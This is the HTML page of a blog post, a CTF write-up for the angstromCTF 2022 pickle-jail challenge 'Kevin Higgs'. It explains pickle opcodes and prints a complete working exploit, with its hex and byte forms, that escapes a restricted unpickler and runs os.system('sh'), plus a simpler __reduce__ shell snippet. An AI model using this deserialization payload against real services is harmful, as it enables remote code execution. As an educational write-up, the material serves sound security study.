@@ -1,0 +1,274 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+<meta charset="utf-8" />
+<title>Kevin Higgs</title>
+
+<meta name="author" content="betaveros" />
+<meta name="description" content=" Now that kmh is gone, clam’s been going through pickle withdrawal. To help him cope, he wrote his own pickle pyjail. It’s nothing like kmh’s, but maybe it’s enough.
+ Language jails are rapidly becoming one of my CTF areas of expertise. Not sure how I feel about that.
+#!/usr/local/bin/python3  import pickle import io import sys  module = type(__builtins__) empty = module(&amp;quot;empty&amp;quot;) empty.empty = empty sys.modules[&amp;quot;empty&amp;quot;] = empty   class SafeUnpickler(pickle.Unpickler): def find_class(self, module, name): if module == &amp;quot;empty&amp;quot; and name.count(&amp;quot;.&amp;quot;) &amp;lt;= 1: return super().find_class(module, name) raise pickle.UnpicklingError(&amp;quot;e-legal&amp;quot;)   lepickle = bytes.fromhex(input(&amp;quot;Enter hex-encoded pickle: &amp;quot;)) if len(lepickle) &amp;gt; 400: print(&amp;quot;your pickle is too large for my taste &amp;gt;:(&amp;quot;) else: SafeUnpickler(io.BytesIO(lepickle)).load() pickle is a Python object serialization format. As the docs page loudly proclaims, it is not secure. Roughly the simplest possible code to pop a shell (adapted from David Hamann, who constructs a more realistic RCE) looks like:
+" /><meta name="generator" content="Hugo 0.88.0-DEV" />
+
+<link rel="canonical" href="//blog.vero.site/post/kevin-higgs" />
+<link rel="alternative" href="/index.xml" title="Bounded-Error Log" type="application/atom+xml" />
+
+<meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<meta name="format-detection" content="telephone=no,email=no,adress=no" />
+<meta http-equiv="Cache-Control" content="no-transform" />
+
+<meta name="robots" content="index,follow" />
+<meta name="referrer" content="origin-when-cross-origin" />
+<meta name="theme-color" content="#330000" />
+<meta name="twitter:creator" content="@betaveros">
+
+<link rel="icon" href="/favicon.ico" />
+
+<link rel="stylesheet" href="/css/bundle.css" />
+<link rel="stylesheet" href="/katex/katex.min.css" />
+
+<!--[if lte IE 11]>
+    <script src="//cdn.bootcss.com/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+</head>
+<body><div id="wrapper">
+<header class="site-header"><h2 class="title"><a href="/">Bounded-Error Log</a></h2><p class="subtitle">theoretical and applied randomness by <a href="https://beta.vero.site/">betaveros</a></p>
+<button class="menu-toggle" type="button" aria-label="Toggle Menu">
+	<span class="icon icon-menu" aria-hidden="true"></span>
+</button>
+<nav class="site-menu collapsed">
+	<h2 class="offscreen">Main Menu</h2>
+	<ul class="menu-list"><li class="menu-item "><a href="/about">About</a></li><li class="menu-item "><a href="/category/life">Life</a></li><li class="menu-item "><a href="/category/thoughts">Thoughts</a></li><li class="menu-item "><a href="/category/self-analysis">Self-Analysis</a></li><li class="menu-item "><a href="/category/math">Math</a></li><li class="menu-item "><a href="/category/cs">CS</a></li><li class="menu-item "><a href="/category/puzzles">Puzzles</a></li><li class="menu-item "><a href="/category/meta">Meta</a></li><li class="menu-item "><a href="/ref">References</a></li><li class="menu-item "><a href="/util">Utilities</a></li><li class="menu-item "><a href="/all">All Posts</a></li></ul>
+</nav>
+<nav class="social-menu collapsed">
+	<h2 class="offscreen">Social Networks</h2>
+	<ul class="social-list"><li class="social-item">
+			<a href="//github.com/betaveros" title="GitHub" aria-label="GitHub"><span class="icon icon-github" aria-hidden="true"></span></a>
+
+		</li><li class="social-item">
+			<a href="/index.xml" title="RSS" aria-label="RSS"><span class="icon icon-rss" aria-hidden="true"></span></a>
+		</li>
+	</ul>
+</nav>
+</header>
+
+<section class="main post-detail">
+	<header>
+		<h1 class="post-title">Kevin Higgs</h1>
+		
+		<h2 class="post-subtitle">ångstromCTF 2022 (210 points)</h2>
+		
+		<p class="post-meta">
+		
+		2022-07-04
+		(1366 words)
+		
+		<span class="post-categories">
+			filed under
+			<a href="/category/cs">CS</a>
+		</span>
+		
+		</p>
+	</header>
+	<article><blockquote>
+<p>Now that kmh is gone, clam’s been going through pickle withdrawal. To help him cope, he wrote his own pickle pyjail. It’s nothing like kmh’s, but maybe it’s enough.</p>
+</blockquote>
+<p>Language jails are rapidly becoming one of my CTF areas of expertise. Not sure how I feel about that.</p>
+<div class="sourceCode" id="cb1"><pre class="sourceCode python"><code class="sourceCode python"><a class="sourceLine" id="cb1-1" title="1"><span class="co">#!/usr/local/bin/python3</span></a>
+<a class="sourceLine" id="cb1-2" title="2"></a>
+<a class="sourceLine" id="cb1-3" title="3"><span class="im">import</span> pickle</a>
+<a class="sourceLine" id="cb1-4" title="4"><span class="im">import</span> io</a>
+<a class="sourceLine" id="cb1-5" title="5"><span class="im">import</span> sys</a>
+<a class="sourceLine" id="cb1-6" title="6"></a>
+<a class="sourceLine" id="cb1-7" title="7">module <span class="op">=</span> <span class="bu">type</span>(__builtins__)</a>
+<a class="sourceLine" id="cb1-8" title="8">empty <span class="op">=</span> module(<span class="st">&quot;empty&quot;</span>)</a>
+<a class="sourceLine" id="cb1-9" title="9">empty.empty <span class="op">=</span> empty</a>
+<a class="sourceLine" id="cb1-10" title="10">sys.modules[<span class="st">&quot;empty&quot;</span>] <span class="op">=</span> empty</a>
+<a class="sourceLine" id="cb1-11" title="11"></a>
+<a class="sourceLine" id="cb1-12" title="12"></a>
+<a class="sourceLine" id="cb1-13" title="13"><span class="kw">class</span> SafeUnpickler(pickle.Unpickler):</a>
+<a class="sourceLine" id="cb1-14" title="14">    <span class="kw">def</span> find_class(<span class="va">self</span>, module, name):</a>
+<a class="sourceLine" id="cb1-15" title="15">        <span class="cf">if</span> module <span class="op">==</span> <span class="st">&quot;empty&quot;</span> <span class="kw">and</span> name.count(<span class="st">&quot;.&quot;</span>) <span class="op">&lt;=</span> <span class="dv">1</span>:</a>
+<a class="sourceLine" id="cb1-16" title="16">            <span class="cf">return</span> <span class="bu">super</span>().find_class(module, name)</a>
+<a class="sourceLine" id="cb1-17" title="17">        <span class="cf">raise</span> pickle.UnpicklingError(<span class="st">&quot;e-legal&quot;</span>)</a>
+<a class="sourceLine" id="cb1-18" title="18"></a>
+<a class="sourceLine" id="cb1-19" title="19"></a>
+<a class="sourceLine" id="cb1-20" title="20">lepickle <span class="op">=</span> <span class="bu">bytes</span>.fromhex(<span class="bu">input</span>(<span class="st">&quot;Enter hex-encoded pickle: &quot;</span>))</a>
+<a class="sourceLine" id="cb1-21" title="21"><span class="cf">if</span> <span class="bu">len</span>(lepickle) <span class="op">&gt;</span> <span class="dv">400</span>:</a>
+<a class="sourceLine" id="cb1-22" title="22">    <span class="bu">print</span>(<span class="st">&quot;your pickle is too large for my taste &gt;:(&quot;</span>)</a>
+<a class="sourceLine" id="cb1-23" title="23"><span class="cf">else</span>:</a>
+<a class="sourceLine" id="cb1-24" title="24">    SafeUnpickler(io.BytesIO(lepickle)).load()</a></code></pre></div>
+<p><code><a href="https://docs.python.org/3/library/pickle.html">pickle</a></code> is a Python object serialization format. As the docs page loudly proclaims, it is not secure. Roughly the simplest possible code to pop a shell (adapted from <a href="https://davidhamann.de/2020/04/05/exploiting-python-pickle/">David Hamann</a>, who constructs a more realistic RCE) looks like:</p>
+<div class="sourceCode" id="cb2"><pre class="sourceCode python"><code class="sourceCode python"><a class="sourceLine" id="cb2-1" title="1"><span class="kw">class</span> Exploit:</a>
+<a class="sourceLine" id="cb2-2" title="2">    <span class="kw">def</span> __reduce__(<span class="va">self</span>): <span class="cf">return</span> os.system, (<span class="st">&quot;sh&quot;</span>,)</a>
+<a class="sourceLine" id="cb2-3" title="3"></a>
+<a class="sourceLine" id="cb2-4" title="4">pickle.loads(pickle.dumps(Exploit()))</a></code></pre></div>
+<p>At a high level, the <code>pickle</code> format is a stack-based mini-language. It’s not much of a language in and of itself — it has no control flow whatsoever and just executes opcodes from start to end. (Each opcode is one byte and is followed by zero or more arguments, whose format depends on the opcode. Each argument is either a fixed number of bytes or an arbitrary number of bytes up to the next newline.) But, crucially, the <code>pickle</code> language has opcodes <code>GLOBAL</code>, which can look up any global, and <code>REDUCE</code>, which can call any callable Python object. Using these two opcodes, you can call just about any Python built-in function with any conceivable argument — for example, <code>os.system</code> with a command to pop a shell. This is why <code>pickle</code> is completely insecure by default.</p>
+<p>However, the behavior of opcode <code>GLOBAL</code> above is determined by <code>Unpickler.find_class</code>, which can be overridden to restrict unpickling. DiceCTF 2022 actually had a pickle challenge with the most restricted unpickler imaginable:</p>
+<div class="sourceCode" id="cb3"><pre class="sourceCode python"><code class="sourceCode python"><a class="sourceLine" id="cb3-1" title="1"><span class="kw">class</span> SafeUnpickler(pickle.Unpickler):</a>
+<a class="sourceLine" id="cb3-2" title="2">    <span class="kw">def</span> find_class(<span class="va">self</span>, module, name):</a>
+<a class="sourceLine" id="cb3-3" title="3">        <span class="cf">raise</span> pickle.UnpicklingError(<span class="ss">f&quot;HACKING DETECTED&quot;</span>)</a></code></pre></div>
+<p>I never got around to writing that challenge up (maybe one day…), but I believe it was not intended to allow or require arbitrary code execution.</p>
+<p>Well, in this challenge, <code>find_class</code> is still pretty restricted. We are only allowed to access properties of the <code>empty</code> module, and if we copy the bit of code that creates <code>empty</code> into a REPL to investigate, it doesn’t seem like there are that many:</p>
+<div class="sourceCode" id="cb4"><pre class="sourceCode python"><code class="sourceCode python"><a class="sourceLine" id="cb4-1" title="1"><span class="op">&gt;&gt;&gt;</span> <span class="bu">dir</span>(empty)</a>
+<a class="sourceLine" id="cb4-2" title="2">[<span class="st">&#39;__doc__&#39;</span>, <span class="st">&#39;__loader__&#39;</span>, <span class="st">&#39;__name__&#39;</span>, <span class="st">&#39;__package__&#39;</span>, <span class="st">&#39;__spec__&#39;</span>, <span class="st">&#39;empty&#39;</span>]</a></code></pre></div>
+<p>But this is misleading; <code>empty</code> has a few properties that every Python object does by dint of inheritance, which are the same properties we use in the standard jailbreaks for <code>eval(..., {"__builtins__": {}})</code>. For example:</p>
+<div class="sourceCode" id="cb5"><pre class="sourceCode python"><code class="sourceCode python"><a class="sourceLine" id="cb5-1" title="1"><span class="op">&gt;&gt;&gt;</span> empty.__class__</a>
+<a class="sourceLine" id="cb5-2" title="2"><span class="op">&lt;</span><span class="kw">class</span> <span class="st">&#39;module&#39;</span><span class="op">&gt;</span></a>
+<a class="sourceLine" id="cb5-3" title="3"><span class="op">&gt;&gt;&gt;</span> empty.__class__.__base__</a>
+<a class="sourceLine" id="cb5-4" title="4"><span class="op">&lt;</span><span class="kw">class</span> <span class="st">&#39;object&#39;</span><span class="op">&gt;</span></a>
+<a class="sourceLine" id="cb5-5" title="5"><span class="op">&gt;&gt;&gt;</span> empty.__class__.__base__.__subclasses__()</a>
+<a class="sourceLine" id="cb5-6" title="6">[<span class="op">&lt;</span><span class="kw">class</span> <span class="st">&#39;type&#39;</span><span class="op">&gt;</span>, ... (a lot of subclasses I will omit here)]</a></code></pre></div>
+<p>To have a target to aim for, I’ll just grab the headlining quote in <a href="https://nedbatchelder.com/blog/201302/finding_python_3_builtins.html">Finding Python3 built-ins</a>:</p>
+<div class="sourceCode" id="cb6"><pre class="sourceCode python"><code class="sourceCode python"><a class="sourceLine" id="cb6-1" title="1">[t <span class="cf">for</span> t <span class="kw">in</span> ().__class__.__base__.__subclasses__() <span class="cf">if</span> t.<span class="va">__name__</span> <span class="op">==</span> <span class="st">&#39;Sized&#39;</span>][<span class="dv">0</span>].<span class="fu">__len__</span>.__globals__[<span class="st">&#39;__builtins__&#39;</span>]</a></code></pre></div>
+<p>If we get that far, we’re home free — we can grab <code>exec</code> or <code>eval</code>, or <code>__import__</code> the <code>os</code> module, or pull off many other kinds of mischief.</p>
+<p>Now, the filtered list comprehension is probably out of our reach to express in pickle code, so we’ll just try to get our pickle to do the following (135 is the index of <code>Sized</code> on the server’s list of <code>__subclasses__</code>, which I found by looking locally and then just trying nearby numbers against the server):</p>
+<p><code>empty.__class__.__base__.__subclasses__()[135].__len__.__globals__['__builtins__']</code></p>
+<p>This is still a little trickier than it sounds. Some resources like <a href="https://stackoverflow.com/questions/25353753/python-can-i-safely-unpickle-untrusted-data">“Can I safely unpickle untrusted data?”</a> makes it sound like we can grab attributes willy-nilly, but <code>getattr</code> is not actually something we have available as a native pickle opcode (without literally grabbing the <code>getattr</code> function from <code>GLOBAL</code>, which is blocked by the overridden <code>find_class</code>). Instead, <code>pickle</code> just has opcodes for <code>setattr</code> and <code>setitem</code>. From the design standpoint of <code>pickle</code>, this makes sense since opcodes are meant to help you construct data, not access it; you shouldn’t need to get attributes of the data you constructed since you probably also put it there. But it makes our job a little more annoying.</p>
+<p>The key insight that allows us to get over this hurdle is that the <code>GLOBAL</code> opcode uses <code>getattr</code> internally. What’s more, in pickle protocol 4, <code>GLOBAL</code> supports dotted paths (which is why the challenge checks <code>name.count(".")</code>): calling <code>GLOBAL</code> with <code>foo</code> and <code>"bar.baz"</code> as arguments will get you <code>foo.bar.baz</code>. The challenge tries to limit us to one level of <code>getattr</code> with the check that <code>name.count(".") &lt;= 1</code>, but because we can use the <code>SETITEM</code> opcode to set items onto <code>empty.__dict__</code>, we can stash intermediate results into <code>empty</code> and then go through <code>empty</code> to access their attributes with a dotted path. That is, given some value <code>foo</code> that we want to get the <code>bar</code> attribute of, we could write pickle opcodes that roughly do the following:</p>
+<div class="sourceCode" id="cb7"><pre class="sourceCode python"><code class="sourceCode python"><a class="sourceLine" id="cb7-1" title="1">empty.__dict__[<span class="st">&#39;foo&#39;</span>] <span class="op">=</span> foo</a>
+<a class="sourceLine" id="cb7-2" title="2">empty.foo.bar</a></code></pre></div>
+<p>(I got stuck getting this to work for a while because I didn’t realize that this requires protocol version 4+, and that that’s still something you need to express in the pickle code. The documentation didn’t help — the pickletools source code mentions in one comment, “However, a pickle does not contain its version number embedded within it.” Eventually I figured this out by manually pickling something on a dotted path and disassembling the pickle.)</p>
+<p>To put the full exploit, we just need to look up the opcodes we need and concatenate them together with the desired arguments. Each opcode is available as a constant from the <code>pickle</code> module, so we can write pretty literate code. The opcodes we use below are:</p>
+<ul>
+<li><code>PROTO</code>, which takes a byte as an argument and indicates that the pickle has that protocol version</li>
+<li><code>GLOBAL</code>, which takes two newline-delimited strings</li>
+<li><code>UNICODE</code>, which takes a newline-delimited string and pushes it onto the stack</li>
+<li><code>SETITEM</code>, which pops <code>c, b, a</code> from the stack, sets <code>a[b] = c</code>, and pushes <code>a</code> back</li>
+<li><code>EMPTY_TUPLE</code>, which pushes a length-0 tuple</li>
+<li><code>REDUCE</code>, which pops a tuple of arguments and a function from the stack, calls the function with the arguments, and pushes the result back onto the stack</li>
+<li><code>BININT1</code>, which takes a byte as an argument and pushes it as an integer</li>
+<li><code>TUPLE1</code>, which constructs a length-1 tuple from the top of the stack</li>
+<li><code>POP</code>, which pops an element off the stack and discards it (not really necessary)</li>
+<li><code>STOP</code>, which concludes the program (not really necessary)</li>
+</ul>
+<p>Here’s my full exploit:</p>
+<div class="sourceCode" id="cb8"><pre class="sourceCode python"><code class="sourceCode python"><a class="sourceLine" id="cb8-1" title="1"><span class="im">import</span> pickle</a>
+<a class="sourceLine" id="cb8-2" title="2">body <span class="op">=</span> (</a>
+<a class="sourceLine" id="cb8-3" title="3">    <span class="co"># Set the protocol version so that dotted paths are allowed</span></a>
+<a class="sourceLine" id="cb8-4" title="4">    pickle.PROTO <span class="op">+</span> b<span class="st">&#39;</span><span class="ch">\x04</span><span class="st">&#39;</span> <span class="op">+</span></a>
+<a class="sourceLine" id="cb8-5" title="5"></a>
+<a class="sourceLine" id="cb8-6" title="6">    <span class="co"># Push empty.__dict__. This will stay on the stack until the end.</span></a>
+<a class="sourceLine" id="cb8-7" title="7">    <span class="co"># We will call SETITEM on it.</span></a>
+<a class="sourceLine" id="cb8-8" title="8">    pickle.GLOBAL <span class="op">+</span> b<span class="st">&#39;empty</span><span class="ch">\n</span><span class="st">__dict__</span><span class="ch">\n</span><span class="st">&#39;</span> <span class="op">+</span></a>
+<a class="sourceLine" id="cb8-9" title="9"></a>
+<a class="sourceLine" id="cb8-10" title="10">    <span class="co"># empty.a = empty.__class__.__base__ = object</span></a>
+<a class="sourceLine" id="cb8-11" title="11">    pickle.UNICODE <span class="op">+</span> b<span class="st">&#39;a</span><span class="ch">\n</span><span class="st">&#39;</span> <span class="op">+</span></a>
+<a class="sourceLine" id="cb8-12" title="12">    pickle.GLOBAL <span class="op">+</span> b<span class="st">&#39;empty</span><span class="ch">\n</span><span class="st">__class__.__base__</span><span class="ch">\n</span><span class="st">&#39;</span> <span class="op">+</span></a>
+<a class="sourceLine" id="cb8-13" title="13">    pickle.SETITEM <span class="op">+</span></a>
+<a class="sourceLine" id="cb8-14" title="14"></a>
+<a class="sourceLine" id="cb8-15" title="15">    <span class="co"># empty.b = empty.a.__subclasses__() = object.__subclasses__()</span></a>
+<a class="sourceLine" id="cb8-16" title="16">    pickle.UNICODE <span class="op">+</span> b<span class="st">&#39;b</span><span class="ch">\n</span><span class="st">&#39;</span> <span class="op">+</span></a>
+<a class="sourceLine" id="cb8-17" title="17">    pickle.GLOBAL <span class="op">+</span> b<span class="st">&#39;empty</span><span class="ch">\n</span><span class="st">a.__subclasses__</span><span class="ch">\n</span><span class="st">&#39;</span> <span class="op">+</span></a>
+<a class="sourceLine" id="cb8-18" title="18">    pickle.EMPTY_TUPLE <span class="op">+</span></a>
+<a class="sourceLine" id="cb8-19" title="19">    pickle.REDUCE <span class="op">+</span></a>
+<a class="sourceLine" id="cb8-20" title="20">    pickle.SETITEM <span class="op">+</span></a>
+<a class="sourceLine" id="cb8-21" title="21"></a>
+<a class="sourceLine" id="cb8-22" title="22">    <span class="co"># empty.c = empty.b[135] = Sized</span></a>
+<a class="sourceLine" id="cb8-23" title="23">    pickle.UNICODE <span class="op">+</span> b<span class="st">&#39;c</span><span class="ch">\n</span><span class="st">&#39;</span> <span class="op">+</span></a>
+<a class="sourceLine" id="cb8-24" title="24">    pickle.GLOBAL <span class="op">+</span> b<span class="st">&#39;empty</span><span class="ch">\n</span><span class="st">b.__getitem__</span><span class="ch">\n</span><span class="st">&#39;</span> <span class="op">+</span></a>
+<a class="sourceLine" id="cb8-25" title="25">    <span class="co"># 135 was the value that worked against the remote server, but is not by</span></a>
+<a class="sourceLine" id="cb8-26" title="26">    <span class="co"># any means constant between Python versions. I ran the snippet earlier to</span></a>
+<a class="sourceLine" id="cb8-27" title="27">    <span class="co"># get the value on my versions of Python and then tweaked it in this</span></a>
+<a class="sourceLine" id="cb8-28" title="28">    <span class="co"># exploit until it worked. Wrong values will just say &quot;Cannot get</span></a>
+<a class="sourceLine" id="cb8-29" title="29">    <span class="co"># attribute&quot;.</span></a>
+<a class="sourceLine" id="cb8-30" title="30">    pickle.BININT1 <span class="op">+</span> <span class="bu">bytes</span>([<span class="dv">135</span>]) <span class="op">+</span></a>
+<a class="sourceLine" id="cb8-31" title="31">    pickle.TUPLE1 <span class="op">+</span></a>
+<a class="sourceLine" id="cb8-32" title="32">    pickle.REDUCE <span class="op">+</span></a>
+<a class="sourceLine" id="cb8-33" title="33">    pickle.SETITEM <span class="op">+</span></a>
+<a class="sourceLine" id="cb8-34" title="34"></a>
+<a class="sourceLine" id="cb8-35" title="35">    <span class="co"># empty.d = empty.c.__len__</span></a>
+<a class="sourceLine" id="cb8-36" title="36">    pickle.UNICODE <span class="op">+</span> b<span class="st">&#39;d</span><span class="ch">\n</span><span class="st">&#39;</span> <span class="op">+</span></a>
+<a class="sourceLine" id="cb8-37" title="37">    pickle.GLOBAL <span class="op">+</span> b<span class="st">&#39;empty</span><span class="ch">\n</span><span class="st">c.__len__</span><span class="ch">\n</span><span class="st">&#39;</span> <span class="op">+</span></a>
+<a class="sourceLine" id="cb8-38" title="38">    pickle.SETITEM <span class="op">+</span></a>
+<a class="sourceLine" id="cb8-39" title="39"></a>
+<a class="sourceLine" id="cb8-40" title="40">    <span class="co"># empty.e = empty.d.__globals__</span></a>
+<a class="sourceLine" id="cb8-41" title="41">    pickle.UNICODE <span class="op">+</span> b<span class="st">&#39;e</span><span class="ch">\n</span><span class="st">&#39;</span> <span class="op">+</span></a>
+<a class="sourceLine" id="cb8-42" title="42">    pickle.GLOBAL <span class="op">+</span> b<span class="st">&#39;empty</span><span class="ch">\n</span><span class="st">d.__globals__</span><span class="ch">\n</span><span class="st">&#39;</span> <span class="op">+</span></a>
+<a class="sourceLine" id="cb8-43" title="43">    pickle.SETITEM <span class="op">+</span></a>
+<a class="sourceLine" id="cb8-44" title="44"></a>
+<a class="sourceLine" id="cb8-45" title="45">    <span class="co"># empty.f = empty.e.__getitem__(&quot;__builtins__&quot;) = empty.e[&quot;__builtins__&quot;]</span></a>
+<a class="sourceLine" id="cb8-46" title="46">    pickle.UNICODE <span class="op">+</span> b<span class="st">&#39;f</span><span class="ch">\n</span><span class="st">&#39;</span> <span class="op">+</span></a>
+<a class="sourceLine" id="cb8-47" title="47">    pickle.GLOBAL <span class="op">+</span> b<span class="st">&#39;empty</span><span class="ch">\n</span><span class="st">e.__getitem__</span><span class="ch">\n</span><span class="st">&#39;</span> <span class="op">+</span></a>
+<a class="sourceLine" id="cb8-48" title="48">    pickle.UNICODE <span class="op">+</span> b<span class="st">&#39;__builtins__</span><span class="ch">\n</span><span class="st">&#39;</span> <span class="op">+</span></a>
+<a class="sourceLine" id="cb8-49" title="49">    pickle.TUPLE1 <span class="op">+</span></a>
+<a class="sourceLine" id="cb8-50" title="50">    pickle.REDUCE <span class="op">+</span></a>
+<a class="sourceLine" id="cb8-51" title="51">    pickle.SETITEM <span class="op">+</span></a>
+<a class="sourceLine" id="cb8-52" title="52"></a>
+<a class="sourceLine" id="cb8-53" title="53">    <span class="co"># we&#39;re ready for the finale; pop empty.__dict__</span></a>
+<a class="sourceLine" id="cb8-54" title="54">    <span class="co"># (not that we really need to)</span></a>
+<a class="sourceLine" id="cb8-55" title="55">    pickle.POP <span class="op">+</span></a>
+<a class="sourceLine" id="cb8-56" title="56"></a>
+<a class="sourceLine" id="cb8-57" title="57">    <span class="co"># pop a shell:</span></a>
+<a class="sourceLine" id="cb8-58" title="58">    <span class="co"># empty.f.__getitem__(&quot;exec&quot;)(&#39;__import__(&quot;os&quot;).system(&quot;sh&quot;)&#39;)</span></a>
+<a class="sourceLine" id="cb8-59" title="59">    pickle.GLOBAL <span class="op">+</span> b<span class="st">&#39;empty</span><span class="ch">\n</span><span class="st">f.__getitem__</span><span class="ch">\n</span><span class="st">&#39;</span> <span class="op">+</span></a>
+<a class="sourceLine" id="cb8-60" title="60">    pickle.UNICODE <span class="op">+</span> b<span class="st">&#39;exec</span><span class="ch">\n</span><span class="st">&#39;</span> <span class="op">+</span></a>
+<a class="sourceLine" id="cb8-61" title="61">    pickle.TUPLE1 <span class="op">+</span></a>
+<a class="sourceLine" id="cb8-62" title="62">    pickle.REDUCE <span class="op">+</span></a>
+<a class="sourceLine" id="cb8-63" title="63">    pickle.UNICODE <span class="op">+</span> b<span class="st">&#39;__import__(&quot;os&quot;).system(&quot;sh&quot;)</span><span class="ch">\n</span><span class="st">&#39;</span> <span class="op">+</span></a>
+<a class="sourceLine" id="cb8-64" title="64">    pickle.TUPLE1 <span class="op">+</span></a>
+<a class="sourceLine" id="cb8-65" title="65">    pickle.REDUCE <span class="op">+</span></a>
+<a class="sourceLine" id="cb8-66" title="66"></a>
+<a class="sourceLine" id="cb8-67" title="67">    <span class="co"># we don&#39;t really need this either</span></a>
+<a class="sourceLine" id="cb8-68" title="68">    pickle.STOP</a>
+<a class="sourceLine" id="cb8-69" title="69">)</a>
+<a class="sourceLine" id="cb8-70" title="70"><span class="co"># pickle.loads(body)</span></a>
+<a class="sourceLine" id="cb8-71" title="71"><span class="co"># pickletools.dis(body)</span></a>
+<a class="sourceLine" id="cb8-72" title="72"><span class="bu">print</span>(body.<span class="bu">hex</span>())</a></code></pre></div>
+<p>The hexed exploit is:</p>
+<div class="sourceCode" id="cb9"><pre class="sourceCode txt breakword"><code class="sourceCode default"><a class="sourceLine" id="cb9-1" title="1">800463656d7074790a5f5f646963745f5f0a56610a63656d7074790a5f5f636c6173735f5f2e5f5f626173655f5f0a7356620a63656d7074790a612e5f5f737562636c61737365735f5f0a29527356630a63656d7074790a622e5f5f6765746974656d5f5f0a4b8785527356640a63656d7074790a632e5f5f6c656e5f5f0a7356650a63656d7074790a642e5f5f676c6f62616c735f5f0a7356660a63656d7074790a652e5f5f6765746974656d5f5f0a565f5f6275696c74696e735f5f0a8552733063656d7074790a662e5f5f6765746974656d5f5f0a56657865630a8552565f5f696d706f72745f5f28226f7322292e73797374656d2822736822290a85522e</a></code></pre></div>
+<p>The bytestring is:</p>
+<div class="sourceCode" id="cb10"><pre class="sourceCode python"><code class="sourceCode python"><a class="sourceLine" id="cb10-1" title="1">b<span class="st">&#39;</span><span class="ch">\x80\x04</span><span class="st">cempty</span><span class="ch">\n</span><span class="st">__dict__</span><span class="ch">\n</span><span class="st">Va</span><span class="ch">\n</span><span class="st">cempty</span><span class="ch">\n</span><span class="st">__class__.__base__</span><span class="ch">\n</span><span class="st">sVb</span><span class="ch">\n</span><span class="st">cempty</span><span class="ch">\n</span><span class="st">a.__subclasses__</span><span class="ch">\n</span><span class="st">)RsVc</span><span class="ch">\n</span><span class="st">cempty</span><span class="ch">\n</span><span class="st">b.__getitem__</span><span class="ch">\n</span><span class="st">K</span><span class="ch">\x87\x85</span><span class="st">RsVd</span><span class="ch">\n</span><span class="st">cempty</span><span class="ch">\n</span><span class="st">c.__len__</span><span class="ch">\n</span><span class="st">sVe</span><span class="ch">\n</span><span class="st">cempty</span><span class="ch">\n</span><span class="st">d.__globals__</span><span class="ch">\n</span><span class="st">sVf</span><span class="ch">\n</span><span class="st">cempty</span><span class="ch">\n</span><span class="st">e.__getitem__</span><span class="ch">\n</span><span class="st">V__builtins__</span><span class="ch">\n\x85</span><span class="st">Rs0cempty</span><span class="ch">\n</span><span class="st">f.__getitem__</span><span class="ch">\n</span><span class="st">Vexec</span><span class="ch">\n\x85</span><span class="st">RV__import__(&quot;os&quot;).system(&quot;sh&quot;)</span><span class="ch">\n\x85</span><span class="st">R.&#39;</span></a></code></pre></div>
+<p>Once we pop a shell, we can <code>cd /</code> and <code>cat flag.txt</code> and we’re done!</p>
+<pre><code>actf{__i_miss_kmh11_pyjails__}</code></pre></article>
+	<footer class="post-footer">
+		
+		<ul class="post-tags">
+			
+			<li><a href="/tag/ctf"><span class="tag">CTF</span></a></li>
+			
+		</ul>
+		
+	</footer>
+	<script data-isso="//node.vero.site/isso/" data-isso-css="false" src="//node.vero.site/isso/js/embed.min.js"></script>
+	<section id="isso-thread"></section>
+	<p class="comments-meta">(note: the commenting setup here is experimental and I may not check my comments often; if you want to tell <em>me</em> something instead of the world, email me!)</p>
+	
+	
+	
+	<footer class="post-footer">
+		<nav class="pagination">
+			
+			<a class="pagination-previous" href="//blog.vero.site/post/caasio">← CaaSio PSE</a>
+			
+			
+			<a class="pagination-next" href="//blog.vero.site/post/mask">Mask →</a>
+			
+		</nav>
+	</footer>
+</section>
+<footer class="site-footer">
+	<p>© 2017-2022 betaveros, Bounded-Error Log</p>
+	<a rel="license" href="http://creativecommons.org/licenses/by-sa/4.0/"><img alt="Creative Commons License" style="border-width:0" src="//i.creativecommons.org/l/by-sa/4.0/88x31.png" /></a><br />Except where otherwise noted, content on this site is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by-sa/4.0/">Creative Commons Attribution-ShareAlike 4.0 International License</a>.
+	<p>Powered by <a href="https://gohugo.io/">Hugo</a>, <a href="http://pandoc.org/">pandoc</a>,
+	<a href="https://www.goatcounter.com/">GoatCounter</a>,
+	<a href="https://posativ.org/isso/">Isso</a>,
+	<a href="https://pages.github.com/">GitHub Pages</a>, and
+	<a href="https://www.cloudflare.com/">CloudFlare</a>.
+	</p>
+	<p>Opinions are mine and not of any employer, past or present.</p>
+</footer>
+
+<script src="/katex/katex.min.js"></script>
+<script src="/katex/contrib/auto-render.min.js"></script>
+<script>renderMathInElement(document.body);</script>
+<script src="/js/bundle.js"></script>
+<script>window.goatcounter = { path: function(p) { return '/blog' + p; } }</script>
+<script data-goatcounter="https://node.vero.site:8073/count" async src="https://node.vero.site:8073/count.js"></script>
+<script src="/js/jquery-3.2.1.min.js"></script>
+
+
+</div></body>
+</html>
